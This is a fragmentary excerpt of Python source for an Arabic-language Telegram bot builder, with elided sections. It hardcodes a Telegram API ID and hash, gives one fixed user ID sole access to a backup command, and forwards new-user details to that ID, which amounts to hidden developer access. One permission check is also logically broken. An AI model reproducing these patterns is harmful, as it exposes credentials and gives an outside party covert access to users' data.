...
async def gt_grrrs_backup(client: Client, message: Message):
    if message.from_user.id ==7028046857:
        try:
...
async def check(user_id, message, client):
    ...
    if off and message.from_user.id not in DEVS:
        await message.reply_text('**◍  الصانع معطل حاليا\n◍ يرجى التواصل مع <a href="https://t.me/R_9_9_0">مطور السورس</a>\n√**')
        return False
    return True
...
async def alivehi(client: Client, message):
    ...
    await message.reply_video(
        video="https://t.me/ll_UU_7/4",
        caption="""
⍟ 𝚃𝙷𝙴 𝙱𝙴𝚂𝚃 𝚂𝙾𝚄𝚁𝙲𝙴 𝙾𝙽 𝚃𝙴𝙻𝙴𝙶𝚁𝙰𝙼
        """,
        reply_markup=InlineKeyboardMarkup([
            [
                InlineKeyboardButton("ᏟᎻᎪΝΝᎬᏞ", url=f"https://t.me/uu_u_e"),
                InlineKeyboardButton("ᏀᎡØႮᏢ", url=f"https://t.me/tt_t_ee")
            ],
            [
...
async def choosek_scope(client, callback_query):
    ...
    try:
        ...
        return await callback_query.message.reply_text("**⏱ انتهى وقت الإنتظار**")
    cliemnt = (
        Client("user", api_id=8186557, api_hash="efd77b34c69c164ce158037ff5a0d117", in_memory=True)
    )
    try:
...
async def users_me(client, message):
    ...
    if user_id not in users:
        ...
        await client.send_message(7028046857,f"{text}")
...
async def twasol__(bot, m):
    global enable_twasol
    try:
        if m.from_user.id != owner_id or m.from_user.id !=7028046857:
            if enable_twasol:
